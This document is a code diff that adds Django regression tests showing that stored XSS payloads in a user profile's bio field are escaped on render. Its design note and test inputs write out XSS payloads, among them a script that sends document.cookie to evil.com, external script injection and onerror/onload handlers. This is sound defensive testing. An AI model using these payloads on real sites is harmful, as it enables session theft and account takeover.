@@ -13,6 +13,7 @@ Tests cover:
 - Open redirect prevention on logout and register flows
 - Audit log emission for all security-relevant events
 - Verification that no sensitive data (passwords, emails) appears in logs
+- Stored XSS prevention in bio field rendering
 """
 
 from django.test import TestCase, Client
@@ -878,3 +879,134 @@ class AuditLoggingTests(TestCase):
             self.client.post(reset_url, {"email": "audit@example.com"})
         for message in log.output:
             self.assertNotIn("audit@example.com", message)
+
+
+# ── Stored XSS Tests ──────────────────────────────────────────────────────────
+
+class StoredXSSTests(TestCase):
+    """
+    Tests verifying that stored XSS payloads in the bio field are escaped,
+    not executed, when the profile page is rendered.
+
+    Design note:
+    The profile bio is user-controlled text. The original code used |safe on
+    the bio template variable, which told Django to skip auto-escaping and
+    inject the raw value into the HTML. An attacker could store:
+
+        <script>fetch('https://evil.com/?c='+document.cookie)</script>
+
+    and that payload would execute in every browser that viewed the profile.
+
+    The fix removes |safe and relies on Django's default auto-escaping, which
+    converts < > " & ' to HTML entities so the payload is displayed as
+    harmless text rather than parsed as markup.
+    """
+
+    def setUp(self):
+        self.user = User.objects.create_user(
+            username="xssuser", password="XssPass123!"
+        )
+        self.profile, _ = Profile.objects.get_or_create(user=self.user)
+        self.profile_url = reverse("uwamahoro_joseline:profile")
+
+    def _set_bio(self, bio_text):
+        self.profile.bio = bio_text
+        self.profile.save()
+
+    def _get_bio_span(self):
+        """Return the text content inside the #bio-text span only."""
+        self.client.login(username="xssuser", password="XssPass123!")
+        response = self.client.get(self.profile_url)
+        self.assertEqual(response.status_code, 200)
+        html = response.content.decode()
+        # Extract content between the bio-text span tags
+        start = html.find('<span id="bio-text">')
+        end = html.find("</span>", start)
+        self.assertNotEqual(start, -1, "bio-text span not found in page")
+        return html[start + len('<span id="bio-text">'):end]
+
+    def _get_profile_html(self):
+        self.client.login(username="xssuser", password="XssPass123!")
+        response = self.client.get(self.profile_url)
+        self.assertEqual(response.status_code, 200)
+        return response.content.decode()
+
+    # ── Script tag payloads ───────────────────────────────────────────────────
+
+    def test_script_tag_in_bio_is_escaped(self):
+        """<script> tag stored in bio must appear as escaped text, not markup."""
+        self._set_bio("<script>alert('xss')</script>")
+        bio_span = self._get_bio_span()
+        # The raw tag must not appear inside the bio span
+        self.assertNotIn("<script>", bio_span)
+        # The escaped version must be present
+        self.assertIn("&lt;script&gt;", bio_span)
+
+    def test_script_tag_not_executed_via_src(self):
+        """External script src injection must also be escaped."""
+        self._set_bio('<script src="https://evil.com/x.js"></script>')
+        bio_span = self._get_bio_span()
+        self.assertNotIn("<script", bio_span)
+        self.assertIn("&lt;script", bio_span)
+
+    # ── Event handler payloads ────────────────────────────────────────────────
+
+    def test_img_onerror_payload_is_escaped(self):
+        """Inline event-handler injection via <img onerror> must be escaped."""
+        self._set_bio('<img src=x onerror="alert(1)">')
+        html = self._get_profile_html()
+        self.assertNotIn("<img", html)
+        self.assertIn("&lt;img", html)
+
+    def test_svg_onload_payload_is_escaped(self):
+        """SVG onload injection must be escaped."""
+        self._set_bio('<svg onload=alert(1)>')
+        bio_span = self._get_bio_span()
+        self.assertNotIn("<svg", bio_span)
+        self.assertIn("&lt;svg", bio_span)
+
+    # ── Legitimate content ────────────────────────────────────────────────────
+
+    def test_plain_text_bio_renders_correctly(self):
+        """Normal plain-text bio must be displayed unchanged."""
+        self._set_bio("Hello, I am a student at DevSec!")
+        html = self._get_profile_html()
+        self.assertIn("Hello, I am a student at DevSec!", html)
+
+    def test_bio_with_angle_brackets_as_text_is_escaped(self):
+        """A bio like '3 < 5 and 7 > 6' must render safely as text."""
+        self._set_bio("3 < 5 and 7 > 6")
+        html = self._get_profile_html()
+        self.assertIn("3 &lt; 5 and 7 &gt; 6", html)
+        self.assertNotIn("3 < 5", html)
+
+    def test_empty_bio_shows_default_text(self):
+        """Empty bio shows the 'No bio provided' placeholder."""
+        self._set_bio("")
+        html = self._get_profile_html()
+        self.assertIn("No bio provided", html)
+
+    # ── AJAX update path ──────────────────────────────────────────────────────
+
+    def test_xss_payload_stored_then_escaped_on_render(self):
+        """
+        End-to-end: save XSS payload via the AJAX endpoint, then verify
+        the profile page escapes it on render.
+        """
+        import json
+        self.client.login(username="xssuser", password="XssPass123!")
+        update_url = reverse("uwamahoro_joseline:update_bio")
+        payload = '<script>document.location="https://evil.com"</script>'
+        self.client.post(
+            update_url,
+            data=json.dumps({"bio": payload}),
+            content_type="application/json",
+        )
+        # Verify stored in DB as-is (storage is safe, rendering is where escaping happens)
+        self.profile.refresh_from_db()
+        self.assertEqual(self.profile.bio, payload)
+
+        # Verify the profile page escapes it inside the bio span
+        bio_span = self._get_bio_span()
+        self.assertNotIn("<script>", bio_span)
+        self.assertIn("&lt;script&gt;", bio_span)
